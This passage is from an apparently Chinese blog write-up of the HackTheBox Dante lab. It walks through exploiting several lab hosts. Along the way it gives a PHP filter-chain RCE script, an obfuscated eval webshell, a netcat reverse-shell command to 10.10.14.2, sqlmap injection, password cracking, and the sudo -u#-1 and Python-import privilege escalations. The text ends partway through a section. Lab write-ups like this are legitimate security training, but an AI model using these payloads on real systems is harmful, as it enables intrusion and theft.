class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"> </span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: final_payload</span><br><span class="line">&#125;,proxies=proxies)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>脚本执行结果如下所示：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e5ff0d2dde5777d6dd21.jpg"></p>
+<p>接下来就反弹个shell，直接改脚本里的命令即可：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e6ba0d2dde5777d7e926.jpg"></p>
+<p>之后我们读取&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress目录下的wp-config.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span> <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;margaret&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Welcome1!2@3#&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="title function_ invoke__">defined</span>( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="title function_ invoke__">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>得到一组帐号密码：margaret:Welcome1!2@3#，还记得我们之前在&#x2F;etc&#x2F;passwd看到的那个账户吗？之后我们就通过ssh来连上去：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e7f70d2dde5777d9ae9a.jpg"></p>
+<p>提示我们当前处于受限制的shell中，那接下来就是逃逸lshell了。通过google，我找到了一种逃逸方法，首先进入vim，之后执行下面两句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p>之后我们就得到了&#x2F;bin&#x2F;bash这个shell了：</p>
+<p><img src="https://pic.imgdb.cn/item/6461e8b30d2dde5777dab5e8.jpg"></p>
+<p>之后cat flag.txt又拿到了一个flag。</p>
+<h3 id="Snake-it-‘til-you-make-it"><a href="#Snake-it-‘til-you-make-it" class="headerlink" title="Snake it ‘til you make it"></a>Snake it ‘til you make it</h3><p>在margaret的用户目录下，存在一个.config目录，进入.config目录，发现使用了Slack，关于Slack的信息师傅们可以自行百度。可以找到缓存的文件~&#x2F;.config&#x2F;Slack&#x2F;exported_data&#x2F;secure&#x2F;2020-05-18.json，里面有一些Frank和Margaret的对话，通过对话可以推理得知，这台机器正是迁移之后的ubuntu镜像主机，而frank的密码TractorHeadtorchDeskmat在缓存文件里面也被Margaret说出，我们直接看这里：</p>
+<p><img src="https://pic.imgdb.cn/item/6461ea9e0d2dde5777dce569.jpg"></p>
+<p>之后我们登录上frank：</p>
+<p><img src="https://pic.imgdb.cn/item/6461eac90d2dde5777dd10aa.jpg"></p>
+<p>上传pspy并运行，可以看到有这么一个进程：</p>
+<p><img src="https://pic.imgdb.cn/item/6461eb600d2dde5777ddad21.jpg"></p>
+<p>在pspy中，我们发现这个进程每隔一段时间就会启动，并且是UID&#x3D;0（root）来启动这个进程。但是我们不能直接修改apache_restart.py，因为权限不够：</p>
+<p><img src="https://pic.imgdb.cn/item/6461ecb90d2dde5777df4d44.jpg"></p>
+<p>那就看一下apache_restart.py的内容吧：</p>
+<p><img src="https://pic.imgdb.cn/item/6461edc30d2dde5777e0c31d.jpg"></p>
+<p>接下来想要提权，首先我们需要了解python导包的搜索顺序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在当前目录下搜索该模块</span><br><span class="line">在环境变量 PYTHONPATH 中指定的路径列表中依次搜索</span><br><span class="line">在 Python 安装路径的 lib 库中搜索</span><br></pre></td></tr></table></figure>
+
+<p>虽然我们不能直接修改apache_restart.py，但是我们可以在&#x2F;home&#x2F;frank的路径下面添加py包呢。因此提权思路就是，在&#x2F;home&#x2F;frank的目录下添加一个urllib.py，内容可以是反弹shell，也可以是别的，只要你能拿到root的shell即可，我这里是给&#x2F;bin&#x2F;bash设置suid位：</p>
+<p><img src="https://pic.imgdb.cn/item/6461ee730d2dde5777e18bc0.jpg"></p>
+<p>之后&#x2F;bin&#x2F;bash -p就拿到root权限了，可以看flag了：</p>
+<p><img src="https://pic.imgdb.cn/item/6462b0890d2dde577711d4be.jpg"></p>
+<p>至此DANTE-NIX02也打完了。</p>
+<h3 id="Feeling-fintastic"><a href="#Feeling-fintastic" class="headerlink" title="Feeling fintastic"></a>Feeling fintastic</h3><p>接下来我们看172.16.1.17，fscan扫出来的开放的端口是80、139、445以及10000。10000端口是webmin服务，对，就是漏洞多的yp的那个。但是没帐号密码，拿不到shell。开放了445端口，尝试smbclient连一下看看能不能拿到什么信息？</p>
+<p><img src="https://pic.imgdb.cn/item/6461efca0d2dde5777e69fb2.jpg"></p>
+<p>有一个forensics目录共享，<code>proxychains4 smbclient \\\\172.16.1.17\\forensics</code>：</p>
+<p><img src="https://pic.imgdb.cn/item/6461f2c30d2dde5777f076d7.jpg"></p>
+<p>存在一个文件名叫monitor的文件，把它下载下来，发现是一个流量包，wireshark分析一下：</p>
+<p><img src="https://pic.imgdb.cn/item/6461f0b90d2dde5777ea2799.jpg"></p>
+<p>可以看到上面这块通过POST请求&#x2F;session_login.cgi之后就GET请求&#x2F;，猜测此处的POST请求登录成功了，那就看一下有没有密码：</p>
+<p><img src="https://pic.imgdb.cn/item/6461f0ff0d2dde5777eaec4a.jpg"></p>
+<p>得到一组帐号密码<code>admin:Password6543</code>，之后去登录10000端口处的webmin服务，发现可以成功登录。之后就是用msf的exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce模块来拿到meterpreter了：</p>
+<p><img src="https://pic.imgdb.cn/item/6461f2a00d2dde5777f02438.jpg"></p>
+<p>直接就是root权限，DANTE-NIX03也打完了。</p>
+<h3 id="Let’s-take-this-discussion-elsewhere"><a href="#Let’s-take-this-discussion-elsewhere" class="headerlink" title="Let’s take this discussion elsewhere"></a>Let’s take this discussion elsewhere</h3><p>接下来我们看172.16.1.13，fscan的扫描结果显示开放的端口为80、443、445，进入80端口，是一个XAMPP的欢迎界面：</p>
+<p><img src="https://pic.imgdb.cn/item/646209df0d2dde57772602b8.jpg"></p>
+<p>smbclient也连不上，443端口也跟80端口界面一样，那接下来就爆破一下80端口的web目录吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/tools/pspy-master]</span><br><span class="line">└─# dirsearch -u http://172.16.1.13/ -t 200 -x 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy=socks5://127.0.0.1:1080 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                 </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                                                                                 </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 220545</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/172.16.1.13/-_23-05-15_06-32-14.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-23-05-15_06-32-14.log</span><br><span class="line"></span><br><span class="line">Target: http://172.16.1.13/</span><br><span class="line"></span><br><span class="line">[06:32:15] Starting: </span><br><span class="line">[06:32:17] 301 -  332B  - /img  -&gt;  http://172.16.1.13/img/                </span><br><span class="line">[06:32:20] 301 -  336B  - /discuss  -&gt;  http://172.16.1.13/discuss/        </span><br><span class="line">[06:32:23] 403 -    1KB - /licenses                                        </span><br><span class="line">[06:32:28] 301 -  338B  - /dashboard  -&gt;  http://172.16.1.13/dashboard/    </span><br><span class="line">[06:32:32] 403 -    1KB - /%20                                             </span><br><span class="line">[06:32:32] 301 -  332B  - /IMG  -&gt;  http://172.16.1.13/IMG/                </span><br><span class="line">[06:32:49] 403 -    1KB - /*checkout*                                      </span><br><span class="line">[06:32:57] 301 -  332B  - /Img  -&gt;  http://172.16.1.13/Img/                </span><br><span class="line">[06:33:07] 403 -    1KB - /phpmyadmin                                      </span><br><span class="line">[06:33:25] 403 -    1KB - /webalizer                                       </span><br><span class="line">[06:33:32] 403 -    1KB - /*docroot*                                       </span><br><span class="line">[06:33:36] 403 -    1KB - /*                                               </span><br><span class="line">[06:33:45] 403 -    1KB - /con                                             </span><br><span class="line">[06:33:54] 301 -  338B  - /Dashboard  -&gt;  http://172.16.1.13/Dashboard/    </span><br><span class="line">[06:34:56] 403 -    1KB - /http%3A                                          </span><br><span class="line">[06:35:16] 403 -    1KB - /**http%3a                                        </span><br><span class="line">[06:35:34] 403 -    1KB - /*http%3A                                         </span><br><span class="line">[06:35:36] 301 -  334B  - /xampp  -&gt;  http://172.16.1.13/xampp/             </span><br><span class="line">[06:36:18] 403 -    1KB - /aux                                              </span><br><span class="line">[06:36:59] 403 -    1KB - /**http%3A                                        </span><br><span class="line">[06:37:47] 403 -    1KB - /%C0                                              </span><br><span class="line">[06:40:35] 403 -    1KB - /server-status                                    </span><br><span class="line">[06:41:24] 403 -    1KB - /%3FRID%3D2671</span><br></pre></td></tr></table></figure>
+
+<p>利用dirsearch爆破除了个&#x2F;discuss目录，进入之后，界面是这样的：</p>
+<p><img src="https://pic.imgdb.cn/item/64620ac20d2dde5777278c1c.jpg"></p>
+<p>google一下之后，可以找到利用方法：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48512">https://www.exploit-db.com/exploits/48512</a>。接下来我们开始注册，在注册上传头像那里直接上传webshell，只是这里似乎存在免杀？直接上传一句话webshell无法上传成功，因此尝试绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">foo</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个很简单的免杀就绕过了，之后会显示注册成功的界面：</p>
+<p><img src="https://pic.imgdb.cn/item/64620c650d2dde57772ae1d1.jpg"></p>
+<p>注册成功之后，进入&#x2F;discuss&#x2F;ups可以看到我们的webshell，蚁剑连接之后拿到shell（注意给蚁剑配置代理哦)。之后可以在<code>C:\Users\Gerald\Desktop</code>目录下看到flag。</p>
+<h3 id="Compare-my-numbers"><a href="#Compare-my-numbers" class="headerlink" title="Compare my numbers"></a>Compare my numbers</h3><p>当前拿到的shell是gerald用户的，接下来开始提权。 进入<code>C:\Program Files (x86)</code>之后可以看到存在一个Druva的目录：</p>
+<p>在Druva inSync的windows客户端6.6.3版本中，存在相对路径遍历允许未经身份验证的本地攻击者以 SYSTEM 权限执行任意操作系统命令的漏洞。因此searchsploit搜索这个漏洞：</p>
+<p><img src="https://pic.imgdb.cn/item/64620ece0d2dde57772dd33a.jpg"></p>
+<p>把48505.txt的后缀改为.py，将其和nc一起上传到靶机上，然后执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe 48505.py &quot;windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc64.exe 10.10.14.2 1237 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹到shell，此时权限为system，DANTE-WS01也成功打完：</p>
+<p><img src="https://pic.imgdb.cn/item/646211080d2dde577730487f.jpg"></p>
+<h3 id="Again-and-again"><a href="#Again-and-again" class="headerlink" title="Again and again"></a>Again and again</h3><p>接下来我们看172.16.1.12，开放的端口有21、22、80、443以及3306。访问web界面，发现与172.16.1.13的界面一样，都是XAMPP的欢迎界面。尝试爆破目录，爆破出&#x2F;blog目录。使用了Responsive Blog：</p>
+<p><img src="https://pic.imgdb.cn/item/646212280d2dde577731e0fe.jpg"></p>
+<p>google一下找到了存在的漏洞，即<code>http://172.16.1.12/blog/category.php?id=1</code>此处存在sql注入，直接sqlmap一把梭：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.1.12/blog/category.php?id=1&quot; --proxy=socks5://127.0.0.1:1080 --dbs --batch</span><br><span class="line"></span><br><span class="line">available databases [7]:                                                                                                                                                                             </span><br><span class="line">[*] blog_admin_db</span><br><span class="line">[*] flag</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] test</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag在flag数据库内。</p>
+<h3 id="Five-doctors"><a href="#Five-doctors" class="headerlink" title="Five doctors"></a>Five doctors</h3><p>之后爆blog_admin_db库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Database: blog_admin_db                                                                                                                                                                              </span><br><span class="line">[13 tables]</span><br><span class="line">+-----------------------------+</span><br><span class="line">| banner_posts                |</span><br><span class="line">| blog_categories             |</span><br><span class="line">| blogs                       |</span><br><span class="line">| editors_choice              |</span><br><span class="line">| links                       |</span><br><span class="line">| membership_grouppermissions |</span><br><span class="line">| membership_groups           |</span><br><span class="line">| membership_userpermissions  |</span><br><span class="line">| membership_userrecords      |</span><br><span class="line">| membership_users            |</span><br><span class="line">| page_hits                   |</span><br><span class="line">| titles                      |</span><br><span class="line">| visitor_info                |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>membership_users表的部分字段爆破结果如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| groupID | memberID | email          | passMD5                                  |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| 2       | admin    | &lt;blank&gt;        | 21232f297a57a5a743894a0e4a801fc3 (admin) |</span><br><span class="line">| NULL    | ben      | ben@dante.htb  | 442179ad1de9c25593cabf625c0badb7         |</span><br><span class="line">| 3       | egre55   | egre55@htb.com | d6501933a2e0ea1f497b87473051417f         |</span><br><span class="line">| 1       | guest    | NULL           | NULL                                     |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>将这三个hash保存在一个文件里，然后john爆破，以下是爆破结果：</p>
+<p><img src="https://pic.imgdb.cn/item/6462138b0d2dde577733498e.jpg"></p>
+<p>得到了ben用户的密码，那看看ssh能不能再用这个密码连上去：</p>
+<p><img src="https://pic.imgdb.cn/item/646213e20d2dde5777339a6e.jpg"></p>
+<p>可以连接上去，在当前目录下可以拿到flag。</p>
+<h3 id="Minus-minus-plus"><a href="#Minus-minus-plus" class="headerlink" title="Minus + minus &#x3D; plus?"></a>Minus + minus &#x3D; plus?</h3><p>之后执行一下sudo -l看看能用sudo执行哪些命令：</p>
+<p><img src="https://pic.imgdb.cn/item/646214600d2dde57773414db.jpg"></p>
+<p>这个意思是指我们可以以任何人除了root的权限执行bash，而执行sudo –version可以看到sudo的版本为1.8.27，因此提权方式为sudo 1.8.27 - Security Bypass，执行<code>sudo -u#-1 /bin/bash</code>，可以以root权限执行任意命令：</p>
+<p><img src="https://pic.imgdb.cn/item/6462b0c10d2dde577711fae0.jpg"></p>
+<p>与此同时，我们可以发现在系统中还存在一个julian用户，尝试读取&#x2F;etc&#x2F;shadow，并用john爆破得到密码，得到一对帐号密码：julian:manchesterunited，相信我，这个密码会在后面用到。至此，DANTE-NIX04也成功getroot。</p>
+<h3 id="Congratulations-to-a-perfect-pear"><a href="#Congratulations-to-a-perfect-pear" class="headerlink" title="Congratulations to a perfect pear"></a>Congratulations to a perfect pear</h3><p>之后我们看172.16.1.102，开放了80、135、139、443、445以及3306端口。在网站的下方我们可以看到这个站使用了<code>Online Marriage Registration System</code>：</p>
+<p><img src="https://pic.imgdb.cn/item/64622a690d2dde57774e73ed.jpg"></p>
+<p>之后使用searchsploit来搜索这个框架，找到了一些POC：</p>
+<p><img src="https://pic.imgdb.cn/item/64622b370d2dde57774f3bbf.jpg"></p>
+<p>随便拉取一个POC来打：</p>
